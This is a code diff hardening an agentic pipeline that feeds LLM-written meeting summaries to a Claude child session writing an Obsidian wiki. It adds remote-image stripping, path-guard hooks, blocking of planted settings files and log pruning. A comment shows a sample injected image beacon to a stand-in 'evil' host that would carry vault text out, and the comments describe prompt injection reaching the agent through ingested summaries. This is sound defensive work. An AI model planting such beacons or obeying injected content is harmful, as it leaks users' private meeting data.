@@ -438,6 +438,28 @@ def verify_ingest(source_paths):
     return True, None
 
 
+# A remote image is a beacon: Obsidian fetches it when the page renders, so an injected
+# ![](https://evil/?d=<vault text>) would ship whatever the child read. Local embeds stay.
+REMOTE_IMAGE = re.compile(r"!\[[^\]\n]*\]\(\s*<?(?:https?:)?//[^)\n]*\)"
+                          r"|<img\b[^>]*?\bsrc\s*=\s*[\"']?\s*(?:https?:)?//[^>]*>", re.I)
+
+
+def strip_remote_images(since):
+    """Remove remote images from wiki pages modified at or after `since` (epoch seconds),
+    naming each file it changed. Never fails the run: the ingest itself may still be good."""
+    for f in (VAULT / "wiki").rglob("*.md"):
+        try:
+            if f.stat().st_mtime < since:
+                continue
+            text = f.read_text(encoding="utf-8")
+            clean, n = REMOTE_IMAGE.subn("", text)
+            if n:
+                f.write_text(clean, encoding="utf-8")
+                log(f"  stripped {n} remote image(s) from {f.relative_to(VAULT)}")
+        except (OSError, UnicodeDecodeError) as e:
+            log(f"  image check skipped {f}: {e}")
+
+
 _SYSTEM_PROMPT_FILE = None
 
 
@@ -469,7 +491,8 @@ def guard_settings():
 
     The child's tools reach any path on disk, and the summaries it ingests are LLM output
     from whatever was said in a meeting. Confine every path-carrying tool to the vault and
-    the wiki skill the prompt tells it to read. See scripts/ingest-path-guard.py.
+    the wiki skill the prompt tells it to read, and Write/Edit to VAULT/wiki (the guard's
+    argument). See scripts/ingest-path-guard.py.
 
     Split out of ingest_to_wiki so the control itself is testable without running an ingest.
     """
@@ -478,10 +501,22 @@ def guard_settings():
     settings = json.dumps({"hooks": {"PreToolUse": [{
         "matcher": "Read|Glob|Grep|Write|Edit",
         "hooks": [{"type": "command",
-                   "command": f'"{sys.executable}" "{guard}"',
+                   "command": f'"{sys.executable}" "{guard}" "{VAULT / "wiki"}"',
                    "timeout": 5000}],
     }]}})
     return settings, os.pathsep.join(str(r) for r in roots)
+
+
+def prune_logs(days=30):
+    """Drop per-run ingest and lint logs older than `days`; they hold full meeting streams.
+    The digit after the dash keeps wiki-lint-launchd.log and ingest-system-prompt.md out."""
+    cutoff = datetime.now().timestamp() - days * 86400
+    for f in [*LOG_DIR.glob("ingest-[0-9]*.log"), *LOG_DIR.glob("wiki-lint-[0-9]*.log")]:
+        try:
+            if f.stat().st_mtime < cutoff:
+                f.unlink()
+        except OSError:
+            pass
 
 
 def ingest_to_wiki(source_paths, extra=""):
@@ -491,6 +526,7 @@ def ingest_to_wiki(source_paths, extra=""):
     LOG_DIR.mkdir(parents=True, exist_ok=True)
     logfile = LOG_DIR / f"ingest-{datetime.now().strftime('%Y%m%d-%H%M%S')}.log"
     log_before_mtime = WIKI_LOG.stat().st_mtime if WIKI_LOG.exists() else 0
+    started = datetime.now().timestamp() - 1  # ponytail: 1 s slack for coarse filesystem mtimes
     now_iso = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
     prompt = (
         f"Every page you create or update includes generated: {{by: fathom-pipeline, at: {now_iso}}} "
@@ -511,16 +547,13 @@ def ingest_to_wiki(source_paths, extra=""):
            "--permission-mode", "acceptEdits",
            "--tools", "Read,Glob,Grep,Write,Edit",
            "--strict-mcp-config",
+           "--setting-sources", "user",  # a planted vault .claude/settings.json never loads
            "--append-system-prompt-file", str(ingest_system_prompt()),
            "--settings", settings,
            "--output-format", "stream-json", "--verbose"]
-    # Doppler injects ANTHROPIC_API_KEY; strip it so claude uses the subscription login, not API billing
-    import os
-    clean_env = {k: v for k, v in os.environ.items() if k != "ANTHROPIC_API_KEY"}
+    clean_env = claude_env(dict(os.environ))  # no API key, our child marker, the stored token
     clean_env["REKALL_GUARD_ROOTS"] = roots
     clean_env["REKALL_GUARD_LOG"] = str(LOG_DIR / "guard-denials.log")
-    claude_env(clean_env)
-    clean_env["MEMORY_STARTER_CHILD"] = "1"  # this claude -p call is our own child; skip recall hook + session digest for it
     # Stream claude's events into the logfile timestamped and truncated, so after
     # a timeout kill the last line names what the session was doing when it hung.
     proc = subprocess.Popen(cmd, cwd=VAULT, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
@@ -536,11 +569,12 @@ def ingest_to_wiki(source_paths, extra=""):
                 auth_failed = True
             # The final result line carries the real error text. Truncating it hid an expired
             # OAuth session behind a 0-token "<synthetic>" message for three runs (2026-10-26).
-            f.write(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] "
-                    f"{line if '\"type\":\"result\"' in line else line[:300]}\n")
+            keep = line if '"type":"result"' in line else line[:300]  # no backslash in an f-string expression before 3.12
+            f.write(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {keep}\n")
             f.flush()
     returncode = proc.wait()
     watchdog.cancel()
+    strip_remote_images(started)  # whatever the outcome: a failed run can still have written pages
     if auth_failed:
         # The CLI can exit 0 on an auth-failed result, and its wording ("OAuth session expired and
         # could not be refreshed") matches none of AUTH_ERRORS, so report this explicitly instead
@@ -582,6 +616,7 @@ def main():
     if lock_fh is None:
         log("another pipeline run is active; exiting")
         return
+    prune_logs()
     age = token_age_days()
     if age is not None and age >= TOKEN_WARN_DAYS:  # ask before it expires, once a day at most
         prompt_reauth()
